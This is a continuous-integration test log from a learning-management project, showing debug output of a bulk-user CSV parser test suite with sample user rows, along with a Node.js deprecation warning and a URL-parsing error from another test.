2025-11-18T17:35:43.5236400Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5237003Z     role: [33m3[39m,
2025-11-18T17:35:43.5237397Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5237810Z     password: [33m-1[39m
2025-11-18T17:35:43.5238175Z   }
2025-11-18T17:35:43.5238437Z }
2025-11-18T17:35:43.5238823Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5239411Z   email: [32m'john@empresa.cl'[39m,
2025-11-18T17:35:43.5240004Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5240479Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5240938Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5241448Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5242072Z }
2025-11-18T17:35:43.5242261Z 
2025-11-18T17:35:43.5243838Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould add warnings for missing names[22m[39m
2025-11-18T17:35:43.5245138Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5246117Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5247628Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5248376Z }
2025-11-18T17:35:43.5249767Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5250801Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5251316Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5252164Z   cellValues: [ [32m'john@test.com'[39m, [32m''[39m, [32m''[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5252825Z   columnMapping: {
2025-11-18T17:35:43.5253285Z     email: [33m0[39m,
2025-11-18T17:35:43.5253723Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5254186Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5254641Z     role: [33m3[39m,
2025-11-18T17:35:43.5255068Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5255517Z     password: [33m-1[39m
2025-11-18T17:35:43.5255881Z   }
2025-11-18T17:35:43.5256146Z }
2025-11-18T17:35:43.5256517Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5257388Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5257882Z   firstName: [32m''[39m,
2025-11-18T17:35:43.5258302Z   lastName: [32m''[39m,
2025-11-18T17:35:43.5258712Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5259175Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5259534Z }
2025-11-18T17:35:43.5259688Z 
2025-11-18T17:35:43.5261266Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould use default role when not specified[22m[39m
2025-11-18T17:35:43.5262571Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5263450Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m ],
2025-11-18T17:35:43.5264572Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m ]
2025-11-18T17:35:43.5265197Z }
2025-11-18T17:35:43.5265566Z [CSV-PARSER] Column indices: {
2025-11-18T17:35:43.5266017Z   email: [33m0[39m,
2025-11-18T17:35:43.5266402Z   firstName: [33m1[39m,
2025-11-18T17:35:43.5267223Z   lastName: [33m2[39m,
2025-11-18T17:35:43.5267611Z   role: [33m-1[39m,
2025-11-18T17:35:43.5267975Z   rut: [33m-1[39m,
2025-11-18T17:35:43.5268355Z   password: [33m-1[39m
2025-11-18T17:35:43.5268685Z }
2025-11-18T17:35:43.5268996Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5269420Z   totalCells: [33m3[39m,
2025-11-18T17:35:43.5270148Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m ],
2025-11-18T17:35:43.5270711Z   columnMapping: {
2025-11-18T17:35:43.5271085Z     email: [33m0[39m,
2025-11-18T17:35:43.5271475Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5271888Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5272287Z     role: [33m-1[39m,
2025-11-18T17:35:43.5272658Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5273046Z     password: [33m-1[39m
2025-11-18T17:35:43.5273382Z   }
2025-11-18T17:35:43.5273634Z }
2025-11-18T17:35:43.5273994Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5274512Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5275021Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5275454Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5275850Z   role: [32m''[39m,
2025-11-18T17:35:43.5276286Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5276678Z }
2025-11-18T17:35:43.5277333Z 
2025-11-18T17:35:43.5279178Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould handle custom column mapping[22m[39m
2025-11-18T17:35:43.5280532Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5281559Z   originalHeaders: [ [32m'role'[39m, [32m'lastname'[39m, [32m'firstname'[39m, [32m'email'[39m ],
2025-11-18T17:35:43.5282851Z   normalizedHeaders: [ [32m'role'[39m, [32m'lastname'[39m, [32m'firstname'[39m, [32m'email'[39m ]
2025-11-18T17:35:43.5283597Z }
2025-11-18T17:35:43.5284995Z [CSV-PARSER] Column indices: { email: [33m3[39m, firstName: [33m2[39m, lastName: [33m1[39m, role: [33m0[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5286016Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5286491Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5287535Z   cellValues: [ [32m'admin'[39m, [32m'Doe'[39m, [32m'John'[39m, [32m'john@test.com'[39m ],
2025-11-18T17:35:43.5288217Z   columnMapping: {
2025-11-18T17:35:43.5288648Z     email: [33m3[39m,
2025-11-18T17:35:43.5289065Z     firstName: [33m2[39m,
2025-11-18T17:35:43.5289518Z     lastName: [33m1[39m,
2025-11-18T17:35:43.5289925Z     role: [33m0[39m,
2025-11-18T17:35:43.5290324Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5290713Z     password: [33m-1[39m
2025-11-18T17:35:43.5291067Z   }
2025-11-18T17:35:43.5291324Z }
2025-11-18T17:35:43.5291695Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5292257Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5292840Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5293336Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5293792Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5294282Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5294659Z }
2025-11-18T17:35:43.5294813Z 
2025-11-18T17:35:43.5296288Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould handle Spanish headers[22m[39m
2025-11-18T17:35:43.5297864Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5298846Z   originalHeaders: [ [32m'correo'[39m, [32m'nombre'[39m, [32m'apellido'[39m, [32m'rol'[39m ],
2025-11-18T17:35:43.5300082Z   normalizedHeaders: [ [32m'correo'[39m, [32m'nombre'[39m, [32m'apellido'[39m, [32m'rol'[39m ]
2025-11-18T17:35:43.5300764Z }
2025-11-18T17:35:43.5302090Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5303102Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5303592Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5304827Z   cellValues: [ [32m'juan@test.com'[39m, [32m'Juan'[39m, [32m'Pérez'[39m, [32m'docente'[39m ],
2025-11-18T17:35:43.5305553Z   columnMapping: {
2025-11-18T17:35:43.5305994Z     email: [33m0[39m,
2025-11-18T17:35:43.5306450Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5307095Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5307534Z     role: [33m3[39m,
2025-11-18T17:35:43.5307930Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5308367Z     password: [33m-1[39m
2025-11-18T17:35:43.5308712Z   }
2025-11-18T17:35:43.5308981Z }
2025-11-18T17:35:43.5309352Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5309895Z   email: [32m'juan@test.com'[39m,
2025-11-18T17:35:43.5310439Z   firstName: [32m'Juan'[39m,
2025-11-18T17:35:43.5310950Z   lastName: [32m'Pérez'[39m,
2025-11-18T17:35:43.5311437Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5311957Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5312339Z }
2025-11-18T17:35:43.5312494Z 
2025-11-18T17:35:43.5313975Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mparseBulkUserData[2m > [22m[2mshould track row numbers[22m[39m
2025-11-18T17:35:43.5315261Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5316351Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ],
2025-11-18T17:35:43.5318091Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m ]
2025-11-18T17:35:43.5318851Z }
2025-11-18T17:35:43.5320270Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m-1[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5321410Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5321925Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5322822Z   cellValues: [ [32m'john@test.com'[39m, [32m'John'[39m, [32m'Doe'[39m, [32m'admin'[39m ],
2025-11-18T17:35:43.5323531Z   columnMapping: {
2025-11-18T17:35:43.5323997Z     email: [33m0[39m,
2025-11-18T17:35:43.5324425Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5324889Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5325357Z     role: [33m3[39m,
2025-11-18T17:35:43.5325779Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5326219Z     password: [33m-1[39m
2025-11-18T17:35:43.5326595Z   }
2025-11-18T17:35:43.5327059Z }
2025-11-18T17:35:43.5327440Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5328013Z   email: [32m'john@test.com'[39m,
2025-11-18T17:35:43.5328552Z   firstName: [32m'John'[39m,
2025-11-18T17:35:43.5329019Z   lastName: [32m'Doe'[39m,
2025-11-18T17:35:43.5329453Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5329936Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5330320Z }
2025-11-18T17:35:43.5330666Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5331165Z   totalCells: [33m4[39m,
2025-11-18T17:35:43.5332085Z   cellValues: [ [32m'invalid-email'[39m, [32m'Jane'[39m, [32m'Smith'[39m, [32m'docente'[39m ],
2025-11-18T17:35:43.5332815Z   columnMapping: {
2025-11-18T17:35:43.5333234Z     email: [33m0[39m,
2025-11-18T17:35:43.5333663Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5334131Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5334548Z     role: [33m3[39m,
2025-11-18T17:35:43.5334932Z     rut: [33m-1[39m,
2025-11-18T17:35:43.5335321Z     password: [33m-1[39m
2025-11-18T17:35:43.5335661Z   }
2025-11-18T17:35:43.5335918Z }
2025-11-18T17:35:43.5336297Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5337130Z   email: [32m'invalid-email'[39m,
2025-11-18T17:35:43.5337699Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5338190Z   lastName: [32m'Smith'[39m,
2025-11-18T17:35:43.5338635Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5339149Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5339526Z }
2025-11-18T17:35:43.5339692Z 
2025-11-18T17:35:43.5341212Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mIntegration tests[2m > [22m[2mshould handle complete workflow[22m[39m
2025-11-18T17:35:43.5342762Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5343913Z   originalHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ],
2025-11-18T17:35:43.5345435Z   normalizedHeaders: [ [32m'email'[39m, [32m'firstname'[39m, [32m'lastname'[39m, [32m'role'[39m, [32m'rut'[39m ]
2025-11-18T17:35:43.5346368Z }
2025-11-18T17:35:43.5348032Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5349087Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5349629Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5350010Z   cellValues: [
2025-11-18T17:35:43.5350559Z     [32m'juan.perez@ejemplo.com'[39m,
2025-11-18T17:35:43.5351094Z     [32m'Juan'[39m,
2025-11-18T17:35:43.5351517Z     [32m'Pérez'[39m,
2025-11-18T17:35:43.5351953Z     [32m'docente'[39m,
2025-11-18T17:35:43.5352398Z     [32m'12.345.678-9'[39m
2025-11-18T17:35:43.5352756Z   ],
2025-11-18T17:35:43.5353050Z   columnMapping: {
2025-11-18T17:35:43.5353439Z     email: [33m0[39m,
2025-11-18T17:35:43.5353853Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5354287Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5354740Z     role: [33m3[39m,
2025-11-18T17:35:43.5355148Z     rut: [33m4[39m,
2025-11-18T17:35:43.5355566Z     password: [33m-1[39m
2025-11-18T17:35:43.5356135Z   }
2025-11-18T17:35:43.5356419Z }
2025-11-18T17:35:43.5356993Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5357665Z   email: [32m'juan.perez@ejemplo.com'[39m,
2025-11-18T17:35:43.5358297Z   firstName: [32m'Juan'[39m,
2025-11-18T17:35:43.5358859Z   lastName: [32m'Pérez'[39m,
2025-11-18T17:35:43.5359365Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5359893Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5360290Z }
2025-11-18T17:35:43.5360656Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5361158Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5361541Z   cellValues: [
2025-11-18T17:35:43.5362046Z     [32m'maria.gonzalez@ejemplo.com'[39m,
2025-11-18T17:35:43.5362531Z     [32m'María'[39m,
2025-11-18T17:35:43.5363091Z     [32m'González'[39m,
2025-11-18T17:35:43.5363484Z     [32m'admin'[39m,
2025-11-18T17:35:43.5363874Z     [32m'98.765.432-1'[39m
2025-11-18T17:35:43.5364217Z   ],
2025-11-18T17:35:43.5364505Z   columnMapping: {
2025-11-18T17:35:43.5364893Z     email: [33m0[39m,
2025-11-18T17:35:43.5365299Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5365716Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5366107Z     role: [33m3[39m,
2025-11-18T17:35:43.5366470Z     rut: [33m4[39m,
2025-11-18T17:35:43.5370705Z     password: [33m-1[39m
2025-11-18T17:35:43.5371228Z   }
2025-11-18T17:35:43.5371651Z }
2025-11-18T17:35:43.5372061Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5372756Z   email: [32m'maria.gonzalez@ejemplo.com'[39m,
2025-11-18T17:35:43.5373412Z   firstName: [32m'María'[39m,
2025-11-18T17:35:43.5373975Z   lastName: [32m'González'[39m,
2025-11-18T17:35:43.5374458Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5374985Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5375384Z }
2025-11-18T17:35:43.5375724Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5376189Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5376561Z   cellValues: [
2025-11-18T17:35:43.5377314Z     [32m'carlos.rodriguez@ejemplo.com'[39m,
2025-11-18T17:35:43.5377881Z     [32m'Carlos'[39m,
2025-11-18T17:35:43.5378295Z     [32m'Rodríguez'[39m,
2025-11-18T17:35:43.5378717Z     [32m'consultor'[39m,
2025-11-18T17:35:43.5379143Z     [32m'11.222.333-4'[39m
2025-11-18T17:35:43.5379487Z   ],
2025-11-18T17:35:43.5379767Z   columnMapping: {
2025-11-18T17:35:43.5380166Z     email: [33m0[39m,
2025-11-18T17:35:43.5380574Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5381015Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5381462Z     role: [33m3[39m,
2025-11-18T17:35:43.5381866Z     rut: [33m4[39m,
2025-11-18T17:35:43.5382622Z     password: [33m-1[39m
2025-11-18T17:35:43.5383008Z   }
2025-11-18T17:35:43.5383283Z }
2025-11-18T17:35:43.5383676Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5384324Z   email: [32m'carlos.rodriguez@ejemplo.com'[39m,
2025-11-18T17:35:43.5384926Z   firstName: [32m'Carlos'[39m,
2025-11-18T17:35:43.5385457Z   lastName: [32m'Rodríguez'[39m,
2025-11-18T17:35:43.5385969Z   role: [32m'consultor'[39m,
2025-11-18T17:35:43.5386481Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5387185Z }
2025-11-18T17:35:43.5387532Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5387995Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5388353Z   cellValues: [
2025-11-18T17:35:43.5388832Z     [32m'ana.martinez@ejemplo.com'[39m,
2025-11-18T17:35:43.5389319Z     [32m'Ana'[39m,
2025-11-18T17:35:43.5389701Z     [32m'Martínez'[39m,
2025-11-18T17:35:43.5390174Z     [32m'equipo_directivo'[39m,
2025-11-18T17:35:43.5390647Z     [32m'55.666.777-8'[39m
2025-11-18T17:35:43.5390990Z   ],
2025-11-18T17:35:43.5391289Z   columnMapping: {
2025-11-18T17:35:43.5391684Z     email: [33m0[39m,
2025-11-18T17:35:43.5392087Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5392507Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5392906Z     role: [33m3[39m,
2025-11-18T17:35:43.5393282Z     rut: [33m4[39m,
2025-11-18T17:35:43.5393677Z     password: [33m-1[39m
2025-11-18T17:35:43.5394022Z   }
2025-11-18T17:35:43.5394274Z }
2025-11-18T17:35:43.5394953Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5395659Z   email: [32m'ana.martinez@ejemplo.com'[39m,
2025-11-18T17:35:43.5396252Z   firstName: [32m'Ana'[39m,
2025-11-18T17:35:43.5396999Z   lastName: [32m'Martínez'[39m,
2025-11-18T17:35:43.5397635Z   role: [32m'equipo_directivo'[39m,
2025-11-18T17:35:43.5398204Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5398591Z }
2025-11-18T17:35:43.5398931Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5399401Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5399764Z   cellValues: [
2025-11-18T17:35:43.5400248Z     [32m'pedro.silva@ejemplo.com'[39m,
2025-11-18T17:35:43.5400730Z     [32m'Pedro'[39m,
2025-11-18T17:35:43.5401105Z     [32m'Silva'[39m,
2025-11-18T17:35:43.5401541Z     [32m'lider_generacion'[39m,
2025-11-18T17:35:43.5402011Z     [32m'99.888.777-6'[39m
2025-11-18T17:35:43.5402362Z   ],
2025-11-18T17:35:43.5402665Z   columnMapping: {
2025-11-18T17:35:43.5403069Z     email: [33m0[39m,
2025-11-18T17:35:43.5403497Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5403947Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5404370Z     role: [33m3[39m,
2025-11-18T17:35:43.5404792Z     rut: [33m4[39m,
2025-11-18T17:35:43.5405235Z     password: [33m-1[39m
2025-11-18T17:35:43.5405611Z   }
2025-11-18T17:35:43.5405888Z }
2025-11-18T17:35:43.5406283Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5407159Z   email: [32m'pedro.silva@ejemplo.com'[39m,
2025-11-18T17:35:43.5407806Z   firstName: [32m'Pedro'[39m,
2025-11-18T17:35:43.5408351Z   lastName: [32m'Silva'[39m,
2025-11-18T17:35:43.5408906Z   role: [32m'lider_generacion'[39m,
2025-11-18T17:35:43.5409487Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5409880Z }
2025-11-18T17:35:43.5410033Z 
2025-11-18T17:35:43.5411562Z [90mstdout[2m | __tests__/utils/bulkUserParser.test.ts[2m > [22m[2mBulk User Parser Utilities[2m > [22m[2mIntegration tests[2m > [22m[2mshould handle real-world messy data[22m[39m
2025-11-18T17:35:43.5412867Z [CSV-PARSER] Column detection: {
2025-11-18T17:35:43.5413995Z   originalHeaders: [ [32m'email'[39m, [32m'first name'[39m, [32m'last name'[39m, [32m'role'[39m, [32m'rut'[39m ],
2025-11-18T17:35:43.5415465Z   normalizedHeaders: [ [32m'email'[39m, [32m'first name'[39m, [32m'last name'[39m, [32m'role'[39m, [32m'rut'[39m ]
2025-11-18T17:35:43.5416257Z }
2025-11-18T17:35:43.5417967Z [CSV-PARSER] Column indices: { email: [33m0[39m, firstName: [33m1[39m, lastName: [33m2[39m, role: [33m3[39m, rut: [33m4[39m, password: [33m-1[39m }
2025-11-18T17:35:43.5418995Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5419773Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5420167Z   cellValues: [
2025-11-18T17:35:43.5420694Z     [32m'  john.doe@company.cl  '[39m,
2025-11-18T17:35:43.5421299Z     [32m' John '[39m,
2025-11-18T17:35:43.5421726Z     [32m' Doe, Jr. '[39m,
2025-11-18T17:35:43.5422157Z     [32m' ADMIN'[39m,
2025-11-18T17:35:43.5422633Z     [32m'12.345.678-5  '[39m
2025-11-18T17:35:43.5423001Z   ],
2025-11-18T17:35:43.5423318Z   columnMapping: {
2025-11-18T17:35:43.5423757Z     email: [33m0[39m,
2025-11-18T17:35:43.5424196Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5424643Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5425068Z     role: [33m3[39m,
2025-11-18T17:35:43.5425466Z     rut: [33m4[39m,
2025-11-18T17:35:43.5425906Z     password: [33m-1[39m
2025-11-18T17:35:43.5426272Z   }
2025-11-18T17:35:43.5426555Z }
2025-11-18T17:35:43.5427178Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5427832Z   email: [32m'  john.doe@company.cl  '[39m,
2025-11-18T17:35:43.5428459Z   firstName: [32m' John '[39m,
2025-11-18T17:35:43.5429027Z   lastName: [32m' Doe, Jr. '[39m,
2025-11-18T17:35:43.5429543Z   role: [32m' ADMIN'[39m,
2025-11-18T17:35:43.5430027Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5430353Z }
2025-11-18T17:35:43.5430644Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5431037Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5432023Z   cellValues: [ [32m'jane@test.com'[39m, [32m'Jane'[39m, [32m''[39m, [32m'docente'[39m, [32m''[39m ],
2025-11-18T17:35:43.5432642Z   columnMapping: {
2025-11-18T17:35:43.5432984Z     email: [33m0[39m,
2025-11-18T17:35:43.5433342Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5433712Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5434065Z     role: [33m3[39m,
2025-11-18T17:35:43.5434389Z     rut: [33m4[39m,
2025-11-18T17:35:43.5434734Z     password: [33m-1[39m
2025-11-18T17:35:43.5435034Z   }
2025-11-18T17:35:43.5435264Z }
2025-11-18T17:35:43.5435582Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5436052Z   email: [32m'jane@test.com'[39m,
2025-11-18T17:35:43.5436501Z   firstName: [32m'Jane'[39m,
2025-11-18T17:35:43.5437066Z   lastName: [32m''[39m,
2025-11-18T17:35:43.5437437Z   role: [32m'docente'[39m,
2025-11-18T17:35:43.5437861Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5438182Z }
2025-11-18T17:35:43.5438465Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5438840Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5439594Z   cellValues: [ [32m'  '[39m, [32m'Missing'[39m, [32m'Email'[39m, [32m'admin'[39m, [32m''[39m ],
2025-11-18T17:35:43.5440173Z   columnMapping: {
2025-11-18T17:35:43.5440515Z     email: [33m0[39m,
2025-11-18T17:35:43.5440859Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5441220Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5441571Z     role: [33m3[39m,
2025-11-18T17:35:43.5441913Z     rut: [33m4[39m,
2025-11-18T17:35:43.5442249Z     password: [33m-1[39m
2025-11-18T17:35:43.5442547Z   }
2025-11-18T17:35:43.5442771Z }
2025-11-18T17:35:43.5443097Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5443486Z   email: [32m'  '[39m,
2025-11-18T17:35:43.5443887Z   firstName: [32m'Missing'[39m,
2025-11-18T17:35:43.5444325Z   lastName: [32m'Email'[39m,
2025-11-18T17:35:43.5444706Z   role: [32m'admin'[39m,
2025-11-18T17:35:43.5445101Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5445421Z }
2025-11-18T17:35:43.5445697Z [CSV-PARSER] Parsing row: {
2025-11-18T17:35:43.5446077Z   totalCells: [33m5[39m,
2025-11-18T17:35:43.5446953Z   cellValues: [ [32m'valid@email.com'[39m, [32m' '[39m, [32m' '[39m, [32m' '[39m, [32m''[39m ],
2025-11-18T17:35:43.5447544Z   columnMapping: {
2025-11-18T17:35:43.5447886Z     email: [33m0[39m,
2025-11-18T17:35:43.5448239Z     firstName: [33m1[39m,
2025-11-18T17:35:43.5448604Z     lastName: [33m2[39m,
2025-11-18T17:35:43.5448944Z     role: [33m3[39m,
2025-11-18T17:35:43.5449271Z     rut: [33m4[39m,
2025-11-18T17:35:43.5449612Z     password: [33m-1[39m
2025-11-18T17:35:43.5450078Z   }
2025-11-18T17:35:43.5450296Z }
2025-11-18T17:35:43.5450628Z [CSV-PARSER] Extracted values: {
2025-11-18T17:35:43.5451100Z   email: [32m'valid@email.com'[39m,
2025-11-18T17:35:43.5451518Z   firstName: [32m' '[39m,
2025-11-18T17:35:43.5451874Z   lastName: [32m' '[39m,
2025-11-18T17:35:43.5452218Z   role: [32m' '[39m,
2025-11-18T17:35:43.5452599Z   password: [32m'MISSING'[39m
2025-11-18T17:35:43.5452941Z }
2025-11-18T17:35:43.5453102Z 
2025-11-18T17:35:43.9955000Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:43.9958626Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:43.9959893Z 
2025-11-18T17:35:44.1374179Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2msubmitGroupAssignment[2m > [22m[2mshould handle submission errors gracefully[22m[39m
2025-11-18T17:35:44.1376140Z Error submitting group assignment: TypeError: Failed to parse URL from /api/assignments/submit-group
2025-11-18T17:35:44.1377320Z [90m    at node:internal/deps/undici/undici:12637:11[39m
2025-11-18T17:35:44.1377971Z [90m    at processTicksAndRejections (node:internal/process/task_queues:95:5)[39m {
2025-11-18T17:35:44.1378412Z   [cause]: TypeError: Invalid URL
2025-11-18T17:35:44.1379118Z   [90m    at new NodeError (node:internal/errors:405:5)[39m
2025-11-18T17:35:44.1379546Z   [90m    at new URL (node:internal/url:676:13)[39m
2025-11-18T17:35:44.1379997Z   [90m    at new Request (node:internal/deps/undici/undici:6119:25)[39m
2025-11-18T17:35:44.1380471Z   [90m    at fetch (node:internal/deps/undici/undici:10415:25)[39m
2025-11-18T17:35:44.1380958Z   [90m    at Object.fetch (node:internal/deps/undici/undici:12636:10)[39m
2025-11-18T17:35:44.1381434Z   [90m    at fetch (node:internal/process/pre_execution:281:25)[39m
2025-11-18T17:35:44.1382986Z       at GroupAssignmentsV2Service.submitGroupAssignment [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/groupAssignmentsV2.js:537:30[90m)[39m
2025-11-18T17:35:44.1384706Z       at [90m/home/runner/work/fne-lms/fne-lms/[39mlib/services/__tests__/groupAssignmentsV2.test.js:203:54
